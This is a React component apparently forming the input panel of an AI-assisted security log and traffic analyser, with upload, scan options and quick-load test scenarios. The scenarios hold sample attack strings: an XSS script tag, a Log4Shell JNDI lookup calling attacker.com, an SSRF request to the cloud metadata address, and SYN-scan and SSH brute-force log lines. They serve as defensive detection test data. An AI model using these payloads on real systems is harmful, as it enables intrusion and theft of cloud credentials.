import { useState, useRef } from 'react';

const INPUT_TYPES = [
  { key: 'log',     label: 'LOG',    desc: 'Server & application logs' },
  { key: 'network', label: 'PACKET', desc: 'Network traffic deep scan' },
  { key: 'sql',     label: 'SQL',    desc: 'SQL injection vector scan' },
  { key: 'text',    label: 'TEXT',   desc: 'Raw text anomaly detection' },
  { key: 'file',    label: 'FILE',   desc: 'Upload forensic artifact' },
];

const TEST_SCENARIOS = [
  { id: 'xss-waf', name: 'Malicious Link Click', type: 'log',
    content: `<134>Mar 24 07:30:01 TWIN ASM: uri="/search?q=<script>alert(document.domain)</script>" request_status="passed" violation_rating="5" staged_sig_names="XSS script tag (URI)" method="GET" response_code="200" ip_client="193.17.57.100"` },
  { id: 'log4shell', name: 'Server Exploit', type: 'log',
    content: `2026-03-24 10:15:22 ERROR [App] User-Agent: \${jndi:ldap://attacker.com/Exploit}\nException in thread "main" java.lang.NullPointerException` },
  { id: 'network-scan', name: 'Network Attack', type: 'network',
    content: `10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN` },
  { id: 'ssrf', name: 'Internal Access', type: 'log',
    content: `GET /webhook?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: api.internal.corp` },
  { id: 'bruteforce', name: 'Password Guessing', type: 'log',
    content: `Failed password for root from 192.168.1.100 port 22\nFailed password for root from 192.168.1.100 port 22\nFailed password for root from 192.168.1.100 port 22` },
];

export default function InputPanel({ onAnalyze, isLoading }) {
  const [inputType, setInputType]   = useState('log');
  const [content,   setContent]     = useState('');
  const [fileName,  setFileName]    = useState('');
  const [dragging,  setDragging]    = useState(false);
  const fileInputRef = useRef(null);

  const [options, setOptions] = useState({
    containment: true,
    deepScan:    true,
    obfuscation: false,
  });

  const toggleOption = (key) => setOptions(prev => ({ ...prev, [key]: !prev[key] }));

  const handleFileRead = (file) => {
    setFileName(file.name);
    const reader = new FileReader();
    reader.onload = (e) => {
      const base64Data = e.target.result.split(',')[1] || e.target.result;
      setContent(base64Data);
    };
    reader.readAsDataURL(file);
  };

  const handleDrop = (e) => {
    e.preventDefault(); setDragging(false);
    const file = e.dataTransfer.files[0];
    if (file) handleFileRead(file);
  };

  const handleSubmit = () => {
    if (!content.trim()) return;
    onAnalyze({ input_type: inputType, content, file_name: fileName, options: { mask: options.obfuscation, block_high_risk: options.containment, log_analysis: options.deepScan } });
  };

  const loadScenario = (s) => { setContent(s.content); setInputType(s.type); setFileName(''); };

  const placeholders = {
    log:     'Paste system / application logs (supports F5 ASM, Syslog, Apache…)',
    network: 'Paste raw packets, PCAP ASCII dumps or tcpdump output…',
    text:    'Enter text to scan for credentials and anomalies…',
    file:    'File content will appear here after upload…',
    sql:     'Enter SQL query to analyze for injection vectors…',
  };

  const canSubmit = content.trim() && !isLoading;

  return (
    <div className="input-panel glass-card">
      <div className="card-title">INPUT ANALYSIS</div>

      {/* Type Selector */}
      <div className="type-selector">
        {INPUT_TYPES.map((t) => (
          <button key={t.key} className={`type-btn ${inputType === t.key ? 'active' : ''}`}
            onClick={() => setInputType(t.key)} title={t.desc}>
            {t.label}
          </button>
        ))}
      </div>

      {/* File Upload */}
      {(inputType === 'file' || inputType === 'log') && (
        <>
          <div
            className={`file-drop-zone ${dragging ? 'dragging' : ''}`}
            onDragOver={(e) => { e.preventDefault(); setDragging(true); }}
            onDragLeave={() => setDragging(false)}
            onDrop={handleDrop}
            onClick={() => fileInputRef.current?.click()}
          >
            <div className="drop-icon">⬆</div>
            <div className="drop-text">DROP FILE OR CLICK TO UPLOAD</div>
          </div>
          <input ref={fileInputRef} type="file" accept=".log,.txt,.pdf,.doc,.docx"
            style={{ display: 'none' }}
            onChange={(e) => { const f = e.target.files[0]; if (f) handleFileRead(f); }} />
          {fileName && <div className="file-name">DATASTREAM: {fileName}</div>}
        </>
      )}

      {/* Text Input */}
      <textarea
        className="text-input"
        placeholder={placeholders[inputType]}
        value={content}
        onChange={(e) => setContent(e.target.value)}
      />

      {/* Analyze Button — primary CTA, prominent position */}
      <button className="analyze-btn" onClick={handleSubmit} disabled={!canSubmit} id="analyze-btn">
        {isLoading ? '[ ANALYZING... ]' : '[ INITIALIZE SCAN ]'}
      </button>

      {/* Test Scenarios */}
      <div className="test-scenarios">
        <div className="scenario-label">Quick load &mdash; test scenarios:</div>
        <div className="scenario-grid">
          {TEST_SCENARIOS.map((s) => (
            <button key={s.id} className="scenario-chip" onClick={() => loadScenario(s)}>
              {s.name}
            </button>
          ))}
          <button className="scenario-chip clear"
            onClick={() => { setContent(''); setFileName(''); }}>
            [X] CLEAR
          </button>
        </div>
      </div>

      {/* Protocol Cards */}
      <div className="protocol-grid">
        {[
          { key: 'containment', title: 'Auto-Block Threats',  desc: 'Stops attacks exceeding risk thresholds before they reach your system.' },
          { key: 'deepScan',    title: 'Deep AI Scan',        desc: 'Uses LLM inference to surface hidden attack patterns.' },
          { key: 'obfuscation', title: 'Hide Sensitive Data', desc: 'Redacts credentials and PII from analysis output.' },
        ].map(card => (
          <div key={card.key} className={`protocol-card ${options[card.key] ? 'active' : ''}`}
            onClick={() => toggleOption(card.key)}>
            <div className="protocol-title">
              {card.title}
              <span className="protocol-badge">ACTIVE</span>
            </div>
            <div className="protocol-desc">{card.desc}</div>
          </div>
        ))}
      </div>
    </div>
  );
}
